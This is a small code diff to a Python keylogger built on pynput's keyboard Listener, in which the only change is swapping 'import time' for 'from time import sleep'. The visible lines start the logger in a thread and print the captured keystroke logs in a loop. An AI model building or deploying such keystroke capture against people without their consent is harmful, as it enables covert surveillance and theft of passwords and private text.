@@ -1,7 +1,9 @@
 import os
-import time
+# import time
 import threading
 from sys import platform
+
+from time import sleep
 
 from pynput.keyboard import Listener
 
@@ -80,7 +82,7 @@ if __name__ == '__main__':
     t = threading.Thread(target=keylog.start)
     t.start()
     while keylog.flag != 1:
-        time.sleep(10)
+        sleep(10)
         logs = keylog.read_logs()
         print(logs)
     t.join()
